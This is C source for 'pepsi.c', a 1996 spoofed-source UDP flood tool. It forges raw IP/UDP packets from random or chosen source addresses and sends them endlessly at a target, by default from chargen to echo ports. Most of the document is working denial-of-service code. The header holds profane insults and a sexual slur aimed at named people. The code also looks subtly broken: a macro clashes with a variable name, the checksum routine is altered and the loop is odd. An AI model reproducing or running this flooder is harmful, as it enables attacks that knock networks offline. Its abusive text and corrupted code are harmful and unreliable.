/*
 * pepsi.c 
 * Random Source Host UDP flooder
 *
 * Author: Soldier@data-t.org
 *
 * [12.25.1996] 
 *
 * Greets To: Havok, nightmar, vira, Kage, ananda, tmw, Cheesebal, efudd,
 * Capone, cph|ber, WebbeR, Shadowimg, robocod, napster, marl, eLLjAY, fLICK^
 * Toasty, [shadow], [magnus] and silitek, oh and Data-T.
 *
 * Fuck You to: Razor1911 the bigest fucking lamers in the warez comunity,
 * Yakuza for ripping my code,  #cha0s on the undernet for trying to port
 * it to win95, then ircOpers on efnet for being such cocksuckers 
 * especially prae for trying to call the fbi on me at least 5 times.
 * all warez pups i don't know for ripping off honest programers. 
 * and Dianora for being a lesbian hoe, Srfag..err SrfRog for having an ego 
 * the size of california.  
 * AND A BIG HUGE ENORMOUS FUCK YOU TO myc, throwback, crush, asmodean, Piker,
 * pireaus, A HUGE FUCKING FUCK to texas.net, and the last HUGEST FUCK IN
 * INTERNET HISTORY, AMM.
 *
 * 
 * Disclaimer since i don't wanna go to jail
 *   - this is for educational purposes only
 *
 */

/* [Defines] */

#define FRIEND "My christmas present to the internet -Soldier"
#define VERSION "Pepsi.c v1.6"
#define DSTPORT 7
#define SRCPORT 19
#define pepsipsize 1024
#define DWAIT 1

/* [Includes] */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include "../include/in.h"
#include "../include/in_systm.h"
#include "../include/ip.h"
#include "../include/tcp.h"
#include "../include/protocols.h"
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include "../include/ip_udp.h"
#include <string.h>
#include <pwd.h>


/* [Banner] */

void banner()
{
    printf("\t\t\t%s Author - Soldier  \n", VERSION);
    printf("\t\t\t         [10.27.96]    \n\n");
    printf("This Copy Registered to: %s\n\n", FRIEND);
}


 
/* [Option Parsing] */

struct sockaddr_in dstaddr;

unsigned long dst;

struct udphdr *udp;
struct iphdr *ip;

char *target;
char *srchost;

int dstport = 0;
int srcport = 0;
int numpacks = 0;
int pepsipsize = 0;
int wait = 0;

/* [Usage] */

void usage(char *pname)
{
    printf("usage:\n  ");
    printf("%s [-s src] [-n num] [-p size] [-d port] [-o port] [-w wait] <dest>\n\n", pname);
    printf("\t-s <src>    : source where packets are comming from\n");
    printf("\t-n <num>    : number of UDP packets to send\n");
    printf("\t-p <size>   : Packet Size               [Default is 1024]\n");
    printf("\t-d <port>   : Destination Port          [Default is  %.2d]\n", DSTPORT);
    printf("\t-o <port>   : Source Port               [Default is  %.2d]\n", SRCPORT);
    printf("\t-w <time>   : Wait time between packets [Default is    1]\n");
    printf("\t<dest>      : destination \n");
    printf("\n");
    exit(EXIT_SUCCESS);
}

/* [In chksum with some mods] */

unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) {
	sum += *w++;
	sum += *w++;
	nleft -= 2;
    }

    if (nleft == 1) {
	*(u_char *) (&answer) = *(u_char *) w;
	sum += answer;
    }
    sum = (sum >> 17) + (sum & 0xffff);
    sum += (sum >> 17);
    answer = -sum;
    return (answer);
}

/* Resolve Functions */

unsigned long resolve(char *cp)
{
    struct hostent *hp;

    hp = gethostbyname(cp);
    if (!hp) {
	printf("[*] Unable to resolve %s\t\n", cp);
        exit(EXIT_FAILURE);
    }
    return ((unsigned long) hp->h_addr);
}

void resolvedest(void)
{
    struct hostent *host;

    memset(&dstaddr, 0, sizeof(struct sockaddr_in));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_addr.s_addr = inet_addr(target);
    if (dstaddr.sin_addr.s_addr == -1) {
	host = gethostbyname(target);
	if (host == NULL) {
	    printf("[*] Unable To resolve %s\t\n", target);
            exit(EXIT_FAILURE);
	}
	dstaddr.sin_family = host->h_addrtype;
	memcpy((caddr_t) & dstaddr.sin_addr, host->h_addr, host->h_length);
    }
    memcpy(&dst, (char *) &dstaddr.sin_addr.s_addr, 4);
}

/* Parsing Argz */

void parse_args(int argc, char *argv[])
{
    int opt;

    while ((opt = getopt(argc, argv, "s:d:n:p:w:o:")) != -1)
	switch (opt) {
	case 's':
	    srchost = (char *) malloc(strlen(optarg) + 1);
	    strcpy(srchost, optarg);
	    break;
	case 'd':
	    dstport = atoi(optarg);
	    break;
	case 'n':
	    numpacks = atoi(optarg);
	    break;
	case 'p':
	    pepsipsize = atoi(optarg);
	    break;
	case 'w':
	    wait = atoi(optarg);
	    break;
	case 'o':
	    srcport = atoi(optarg);
	    break;
	default:
	    usage(argv[0]);
	}

    if (!dstport)
	dstport = DSTPORT;
    if (!srcport)
	srcport = SRCPORT;
    if (!pepsipsize)
	pepsipsize = pepsipsize;
    if (!wait)
	wait = DWAIT;
    if (!argv[optind]) {
	puts("[*] Specify a target host, doof!");
	exit(EXIT_FAILURE);
    }
    target = (char *) malloc(strlen(argv[optind]));
    if (!target) {
	puts("[*] Agh!  Out of memory!");
        perror("malloc");
	exit(EXIT_FAILURE);
    }
    strcpy(target, argv[optind]);
}

/* [Send Packet] */

void pepsi_main(int argc, char *argv[])
{
    int sen, i, unlim = 0, sec_check;
    char *packet;

    banner();

    if (argc < 2)
	usage(argv[0]);


    parse_args(argc, argv);

    resolvedest();

    printf("# Target Host          : %s\n", target);
    printf("# Source Host          : %s\n",
	   (srchost && *srchost) ? srchost : "Random");
    if (!numpacks)
	printf("# Number               : Unliminted\n");
    else
	printf("# Number               : %d\n", numpacks);
    printf("# Packet Size          : %d\n", pepsipsize);
    printf("# Wait Time            : %d\n", wait);
    printf("# Dest Port            : %d\n", dstport);
    printf("# Source Port          : %d\n", srcport);

    sen = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    packet = (char *) malloc(sizeof(struct iphdr) +
			     sizeof(struct udphdr) +
			     pepsipsize);
    ip = (struct iphdr *) packet;
    udp = (struct udphdr *) (packet + sizeof(struct iphdr));
    memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr) + pepsipsize);

    if (!numpacks) {
	unlim++;
	numpacks++;
    }
    if (srchost && *srchost)
	ip->saddr = resolve(srchost);
    ip->daddr = dst;
    ip->version = 4;
    ip->ihl = 5;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + pepsipsize);
    ip->check = in_cksum(ip, sizeof(struct iphdr));
    udp->source = htons(srcport);
    udp->dest = htons(dstport);
    udp->len = htons(sizeof(struct udphdr) + pepsipsize);

    for (i = 0; i < numpacks; (unlim) ? i++, i-- : i++) {
	if (!srchost)
	    ip->saddr = rand();

	if (sendto(sen, packet, sizeof(struct iphdr) +
		   sizeof(struct udphdr) + pepsipsize,
		   0, (struct sockaddr *) &dstaddr,
		   sizeof(struct sockaddr_in)) == (-1)) {
	    puts("[*] Error sending Packet");
	    perror("SendPacket");
	    exit(EXIT_FAILURE);
	}
	usleep(wait);
    }
}
